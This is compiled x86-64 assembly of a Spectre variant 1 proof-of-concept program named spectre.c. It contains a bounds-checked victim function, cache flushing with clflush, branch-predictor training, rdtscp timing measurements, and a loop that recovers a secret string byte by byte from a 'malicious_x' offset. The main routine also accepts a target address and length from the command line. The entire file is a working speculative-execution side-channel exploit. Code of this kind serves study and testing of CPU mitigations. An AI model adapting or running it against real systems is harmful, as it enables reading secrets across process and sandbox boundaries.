	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movsxd	rcx, dword ptr [rip + array1_size]
	xor	eax, eax
	cmp	rcx, rdi
	seta	al
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	leakByteNoinlineFunction        # -- Begin function leakByteNoinlineFunction
	.p2align	4, 0x90
	.type	leakByteNoinlineFunction,@function
leakByteNoinlineFunction:               # @leakByteNoinlineFunction
	.cfi_startproc
# %bb.0:
	mov	eax, edi
	shl	rax, 9
	mov	al, byte ptr [rax + array2]
	and	byte ptr [rip + temp], al
	ret
.Lfunc_end1:
	.size	leakByteNoinlineFunction, .Lfunc_end1-leakByteNoinlineFunction
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	movsxd	rax, dword ptr [rip + array1_size]
	cmp	rax, rdi
	jbe	.LBB2_1
# %bb.2:
	movzx	edi, byte ptr [rdi + array1]
	jmp	leakByteNoinlineFunction        # TAILCALL
.LBB2_1:
	ret
.Lfunc_end2:
	.size	victim_function, .Lfunc_end2-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	push	r15
	.cfi_def_cfa_offset 24
	push	r14
	.cfi_def_cfa_offset 32
	push	r13
	.cfi_def_cfa_offset 40
	push	r12
	.cfi_def_cfa_offset 48
	push	rbx
	.cfi_def_cfa_offset 56
	sub	rsp, 40
	.cfi_def_cfa_offset 96
	.cfi_offset rbx, -56
	.cfi_offset r12, -48
	.cfi_offset r13, -40
	.cfi_offset r14, -32
	.cfi_offset r15, -24
	.cfi_offset rbp, -16
	mov	qword ptr [rsp + 24], rdx       # 8-byte Spill
	mov	qword ptr [rsp + 16], rsi       # 8-byte Spill
	mov	qword ptr [rsp + 32], rdi       # 8-byte Spill
	mov	edi, offset readMemoryByte.results
	mov	edx, 1024
	xor	esi, esi
	call	memset
	mov	r13d, 999
	mov	r12d, 2863311531
	jmp	.LBB3_2
	.p2align	4, 0x90
.LBB3_1:                                #   in Loop: Header=BB3_2 Depth=1
	lea	esi, [r13 - 1]
	cmp	r13d, 2
	mov	r13d, esi
	jb	.LBB3_24
.LBB3_2:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_3 Depth 2
                                        #     Child Loop BB3_5 Depth 2
                                        #       Child Loop BB3_30 Depth 3
                                        #     Child Loop BB3_8 Depth 2
                                        #     Child Loop BB3_13 Depth 2
	xor	eax, eax
	.p2align	4, 0x90
.LBB3_3:                                #   Parent Loop BB3_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	byte ptr [rax + array2]
	clflush	byte ptr [rax + array2+512]
	clflush	byte ptr [rax + array2+1024]
	clflush	byte ptr [rax + array2+1536]
	clflush	byte ptr [rax + array2+2048]
	clflush	byte ptr [rax + array2+2560]
	clflush	byte ptr [rax + array2+3072]
	clflush	byte ptr [rax + array2+3584]
	add	rax, 4096
	cmp	rax, 131072
	jne	.LBB3_3
# %bb.4:                                #   in Loop: Header=BB3_2 Depth=1
	mov	eax, r13d
	cdq
	idiv	dword ptr [rip + array1_size]
	mov	r14d, edx
	mov	rbx, r14
	xor	rbx, qword ptr [rsp + 32]       # 8-byte Folded Reload
	mov	r15d, 29
	jmp	.LBB3_5
	.p2align	4, 0x90
.LBB3_6:                                #   in Loop: Header=BB3_5 Depth=2
	mov	eax, r15d
	imul	rax, r12
	shr	rax, 34
	add	eax, eax
	lea	eax, [rax + 2*rax]
	not	eax
	add	eax, r15d
	and	eax, -65536
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, rbx
	xor	rdi, r14
	call	victim_function
	sub	r15d, 1
	jb	.LBB3_7
.LBB3_5:                                #   Parent Loop BB3_2 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_30 Depth 3
	clflush	byte ptr [rip + array1_size]
	mov	dword ptr [rsp + 12], 0
	mov	eax, dword ptr [rsp + 12]
	cmp	eax, 99
	jg	.LBB3_6
	.p2align	4, 0x90
.LBB3_30:                               #   Parent Loop BB3_2 Depth=1
                                        #     Parent Loop BB3_5 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	add	dword ptr [rsp + 12], 1
	mov	eax, dword ptr [rsp + 12]
	cmp	eax, 100
	jl	.LBB3_30
	jmp	.LBB3_6
	.p2align	4, 0x90
.LBB3_7:                                #   in Loop: Header=BB3_2 Depth=1
	mov	edi, 13
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_11:                               #   in Loop: Header=BB3_8 Depth=2
	add	edi, 167
	cmp	edi, 42765
	je	.LBB3_12
.LBB3_8:                                #   Parent Loop BB3_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzx	ebp, dil
	mov	rbx, rbp
	shl	rbx, 9
	rdtscp
	mov	rsi, rdx
	shl	rsi, 32
	or	rsi, rax
	movzx	eax, byte ptr [rbx + array2]
	rdtscp
	shl	rdx, 32
	or	rdx, rax
	sub	rdx, rsi
	cmp	rdx, 100
	ja	.LBB3_11
# %bb.9:                                #   in Loop: Header=BB3_8 Depth=2
	mov	eax, r13d
	cdq
	idiv	dword ptr [rip + array1_size]
                                        # kill: def $edx killed $edx def $rdx
	cmp	dil, byte ptr [rdx + array1]
	je	.LBB3_11
# %bb.10:                               #   in Loop: Header=BB3_8 Depth=2
	mov	eax, ebp
	add	dword ptr [4*rax + readMemoryByte.results], 1
	jmp	.LBB3_11
	.p2align	4, 0x90
.LBB3_12:                               #   in Loop: Header=BB3_2 Depth=1
	mov	edx, -1
	xor	eax, eax
	mov	esi, -1
	jmp	.LBB3_13
	.p2align	4, 0x90
.LBB3_20:                               #   in Loop: Header=BB3_13 Depth=2
	mov	esi, edx
	mov	edx, edi
.LBB3_29:                               #   in Loop: Header=BB3_13 Depth=2
	add	rax, 2
	cmp	rax, 256
	je	.LBB3_21
.LBB3_13:                               #   Parent Loop BB3_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	test	edx, edx
	js	.LBB3_14
# %bb.15:                               #   in Loop: Header=BB3_13 Depth=2
	mov	edi, dword ptr [4*rax + readMemoryByte.results]
	mov	ebp, edx
	cmp	edi, dword ptr [4*rbp + readMemoryByte.results]
	jge	.LBB3_14
# %bb.16:                               #   in Loop: Header=BB3_13 Depth=2
	test	esi, esi
	js	.LBB3_18
# %bb.17:                               #   in Loop: Header=BB3_13 Depth=2
	mov	ebp, esi
	cmp	edi, dword ptr [4*rbp + readMemoryByte.results]
	jl	.LBB3_19
.LBB3_18:                               #   in Loop: Header=BB3_13 Depth=2
	mov	esi, eax
.LBB3_19:                               #   in Loop: Header=BB3_13 Depth=2
	lea	rdi, [rax + 1]
	test	edx, edx
	jns	.LBB3_25
	jmp	.LBB3_20
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_13 Depth=2
	mov	esi, edx
	mov	edx, eax
	lea	rdi, [rax + 1]
	test	edx, edx
	js	.LBB3_20
.LBB3_25:                               #   in Loop: Header=BB3_13 Depth=2
	mov	ebx, dword ptr [4*rax + readMemoryByte.results+4]
	mov	ebp, edx
	cmp	ebx, dword ptr [4*rbp + readMemoryByte.results]
	jge	.LBB3_20
# %bb.26:                               #   in Loop: Header=BB3_13 Depth=2
	test	esi, esi
	js	.LBB3_28
# %bb.27:                               #   in Loop: Header=BB3_13 Depth=2
	mov	ebp, esi
	cmp	ebx, dword ptr [4*rbp + readMemoryByte.results]
	jl	.LBB3_29
.LBB3_28:                               #   in Loop: Header=BB3_13 Depth=2
	mov	esi, edi
	jmp	.LBB3_29
	.p2align	4, 0x90
.LBB3_21:                               #   in Loop: Header=BB3_2 Depth=1
	movsxd	rdx, edx
	mov	edi, dword ptr [4*rdx + readMemoryByte.results]
	movsxd	rax, esi
	mov	esi, dword ptr [4*rax + readMemoryByte.results]
	lea	ebp, [rsi + rsi]
	add	ebp, 5
	cmp	edi, ebp
	jge	.LBB3_24
# %bb.22:                               #   in Loop: Header=BB3_2 Depth=1
	cmp	edi, 2
	jne	.LBB3_1
# %bb.23:                               #   in Loop: Header=BB3_2 Depth=1
	test	esi, esi
	jne	.LBB3_1
.LBB3_24:
	xor	dword ptr [rip + readMemoryByte.results], ecx
	mov	rsi, qword ptr [rsp + 16]       # 8-byte Reload
	mov	byte ptr [rsi], dl
	mov	ecx, dword ptr [4*rdx + readMemoryByte.results]
	mov	rdx, qword ptr [rsp + 24]       # 8-byte Reload
	mov	dword ptr [rdx], ecx
	mov	byte ptr [rsi + 1], al
	mov	eax, dword ptr [4*rax + readMemoryByte.results]
	mov	dword ptr [rdx + 4], eax
	add	rsp, 40
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	r12
	.cfi_def_cfa_offset 40
	pop	r13
	.cfi_def_cfa_offset 32
	pop	r14
	.cfi_def_cfa_offset 24
	pop	r15
	.cfi_def_cfa_offset 16
	pop	rbp
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end3:
	.size	readMemoryByte, .Lfunc_end3-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	push	r15
	.cfi_def_cfa_offset 24
	push	r14
	.cfi_def_cfa_offset 32
	push	r13
	.cfi_def_cfa_offset 40
	push	r12
	.cfi_def_cfa_offset 48
	push	rbx
	.cfi_def_cfa_offset 56
	sub	rsp, 40
	.cfi_def_cfa_offset 96
	.cfi_offset rbx, -56
	.cfi_offset r12, -48
	.cfi_offset r13, -40
	.cfi_offset r14, -32
	.cfi_offset r15, -24
	.cfi_offset rbp, -16
	mov	qword ptr [rsp + 32], rsi       # 8-byte Spill
	cmp	edi, 3
	jne	.LBB4_1
# %bb.10:
	lea	r13, [rsp + 14]
	lea	rbx, [rsp + 24]
	mov	r15d, offset .L.str.9
	.p2align	4, 0x90
.LBB4_11:                               # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_17 Depth 2
	mov	rdi, qword ptr [rip + stdin]
	call	getc
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB4_11
# %bb.12:                               #   in Loop: Header=BB4_11 Depth=1
	cmp	eax, 1912602624
	je	.LBB4_15
# %bb.13:                               #   in Loop: Header=BB4_11 Depth=1
	cmp	eax, 1761607680
	jne	.LBB4_21
# %bb.14:                               #   in Loop: Header=BB4_11 Depth=1
	xor	eax, eax
	call	getpid
	mov	edi, offset .L.str.13
	mov	esi, offset check+33
	mov	edx, eax
	xor	eax, eax
	call	printf
	jmp	.LBB4_11
	.p2align	4, 0x90
.LBB4_15:                               #   in Loop: Header=BB4_11 Depth=1
	mov	rdx, qword ptr [rip + secret]
	mov	edi, offset .L.str.1
	mov	rsi, rdx
	xor	eax, eax
	call	printf
	mov	rdi, qword ptr [rip + secret]
	mov	rax, rdi
	mov	r14d, offset array1
	sub	rax, r14
	mov	qword ptr [rsp + 16], rax
	call	strlen
	mov	dword ptr [rsp + 8], eax
	mov	edi, offset array2
	mov	edx, 131072
	mov	esi, 1
	call	memset
	mov	rbp, qword ptr [rsp + 32]       # 8-byte Reload
	mov	rdi, qword ptr [rbp + 8]
	mov	esi, offset .L.str.2
	lea	rdx, [rsp + 16]
	xor	eax, eax
	call	__isoc99_sscanf
	sub	qword ptr [rsp + 16], r14
	mov	rdi, qword ptr [rbp + 16]
	mov	esi, offset .L.str.3
	lea	rdx, [rsp + 8]
	xor	eax, eax
	call	__isoc99_sscanf
	mov	rsi, qword ptr [rsp + 16]
	mov	edx, dword ptr [rsp + 8]
	mov	edi, offset .L.str.4
	xor	eax, eax
	call	printf
	mov	esi, dword ptr [rsp + 8]
	mov	edi, offset .L.str.5
	xor	eax, eax
	call	printf
	mov	eax, dword ptr [rsp + 8]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp + 8], ecx
	test	eax, eax
	jle	.LBB4_11
# %bb.16:                               #   in Loop: Header=BB4_11 Depth=1
	xor	r12d, r12d
	jmp	.LBB4_17
	.p2align	4, 0x90
.LBB4_19:                               #   in Loop: Header=BB4_17 Depth=2
	add	r12, 1
	mov	edi, 10
	call	putchar
	mov	eax, dword ptr [rsp + 8]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp + 8], ecx
	test	eax, eax
	jle	.LBB4_11
.LBB4_17:                               #   Parent Loop BB4_11 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	rsi, qword ptr [rsp + 16]
	mov	rax, qword ptr [rip + secret]
	movsx	edx, byte ptr [rax + r12]
	mov	edi, offset .L.str.6
	xor	eax, eax
	call	printf
	mov	rdi, qword ptr [rsp + 16]
	lea	rax, [rdi + 1]
	mov	qword ptr [rsp + 16], rax
	mov	rsi, r13
	mov	rdx, rbx
	call	readMemoryByte
	mov	r14d, dword ptr [rsp + 24]
	mov	ebp, dword ptr [rsp + 28]
	lea	eax, [rbp + rbp]
	cmp	r14d, eax
	mov	esi, offset .L.str.8
	cmovl	rsi, r15
	mov	edi, offset .L.str.7
	xor	eax, eax
	call	printf
	movzx	esi, byte ptr [rsp + 14]
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	mov	edi, offset .L.str.10
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, r14d
	xor	eax, eax
	call	printf
	test	ebp, ebp
	jle	.LBB4_19
# %bb.18:                               #   in Loop: Header=BB4_17 Depth=2
	movzx	esi, byte ptr [rsp + 15]
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	mov	edi, offset .L.str.11
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, ebp
	xor	eax, eax
	call	printf
	jmp	.LBB4_19
.LBB4_1:
	lea	r14, [rsp + 14]
	lea	r15, [rsp + 24]
	mov	r13d, offset .L.str.9
	jmp	.LBB4_2
	.p2align	4, 0x90
.LBB4_20:                               #   in Loop: Header=BB4_2 Depth=1
	xor	eax, eax
	call	getpid
	mov	edi, offset .L.str.13
	mov	esi, offset check+33
	mov	edx, eax
	xor	eax, eax
	call	printf
.LBB4_2:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_7 Depth 2
	mov	rdi, qword ptr [rip + stdin]
	call	getc
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB4_2
# %bb.3:                                #   in Loop: Header=BB4_2 Depth=1
	cmp	eax, 1761607680
	je	.LBB4_20
# %bb.4:                                #   in Loop: Header=BB4_2 Depth=1
	cmp	eax, 1912602624
	jne	.LBB4_21
# %bb.5:                                #   in Loop: Header=BB4_2 Depth=1
	mov	rdx, qword ptr [rip + secret]
	mov	edi, offset .L.str.1
	mov	rsi, rdx
	xor	eax, eax
	call	printf
	mov	rdi, qword ptr [rip + secret]
	mov	rax, rdi
	mov	ecx, offset array1
	sub	rax, rcx
	mov	qword ptr [rsp + 16], rax
	call	strlen
	mov	rbp, rax
	mov	dword ptr [rsp + 8], ebp
	mov	edi, offset array2
	mov	edx, 131072
	mov	esi, 1
	call	memset
	mov	edi, offset .L.str.5
	mov	esi, ebp
	xor	eax, eax
	call	printf
	mov	eax, dword ptr [rsp + 8]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp + 8], ecx
	test	eax, eax
	jle	.LBB4_2
# %bb.6:                                #   in Loop: Header=BB4_2 Depth=1
	xor	r12d, r12d
	jmp	.LBB4_7
	.p2align	4, 0x90
.LBB4_9:                                #   in Loop: Header=BB4_7 Depth=2
	add	r12, 1
	mov	edi, 10
	call	putchar
	mov	eax, dword ptr [rsp + 8]
	lea	ecx, [rax - 1]
	mov	dword ptr [rsp + 8], ecx
	test	eax, eax
	jle	.LBB4_2
.LBB4_7:                                #   Parent Loop BB4_2 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	rsi, qword ptr [rsp + 16]
	mov	rax, qword ptr [rip + secret]
	movsx	edx, byte ptr [rax + r12]
	mov	edi, offset .L.str.6
	xor	eax, eax
	call	printf
	mov	rdi, qword ptr [rsp + 16]
	lea	rax, [rdi + 1]
	mov	qword ptr [rsp + 16], rax
	mov	rsi, r14
	mov	rdx, r15
	call	readMemoryByte
	mov	ebx, dword ptr [rsp + 24]
	mov	ebp, dword ptr [rsp + 28]
	lea	eax, [rbp + rbp]
	cmp	ebx, eax
	mov	esi, offset .L.str.8
	cmovl	rsi, r13
	mov	edi, offset .L.str.7
	xor	eax, eax
	call	printf
	movzx	esi, byte ptr [rsp + 14]
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	mov	edi, offset .L.str.10
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, ebx
	xor	eax, eax
	call	printf
	test	ebp, ebp
	jle	.LBB4_9
# %bb.8:                                #   in Loop: Header=BB4_7 Depth=2
	movzx	esi, byte ptr [rsp + 15]
	lea	eax, [rsi - 32]
	cmp	al, 95
	mov	edx, 63
	cmovb	edx, esi
	mov	edi, offset .L.str.11
                                        # kill: def $esi killed $esi killed $rsi
	mov	ecx, ebp
	xor	eax, eax
	call	printf
	jmp	.LBB4_9
.LBB4_21:
	xor	eax, eax
	add	rsp, 40
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	r12
	.cfi_def_cfa_offset 40
	pop	r13
	.cfi_def_cfa_offset 32
	pop	r14
	.cfi_def_cfa_offset 24
	pop	r15
	.cfi_def_cfa_offset 16
	pop	rbp
	.cfi_def_cfa_offset 8
	ret
.Lfunc_end4:
	.size	main, .Lfunc_end4-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
	.p2align	4
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	3
secret:
	.quad	.L.str
	.size	secret, 8

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	temp1,@object                   # @temp1
	.globl	temp1
	.p2align	3
temp1:
	.quad	0                               # 0x0
	.size	temp1, 8

	.type	array2,@object                  # @array2
	.globl	array2
	.p2align	4
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,16
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
	.p2align	4
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
	.p2align	4
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 11.1.0-6"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
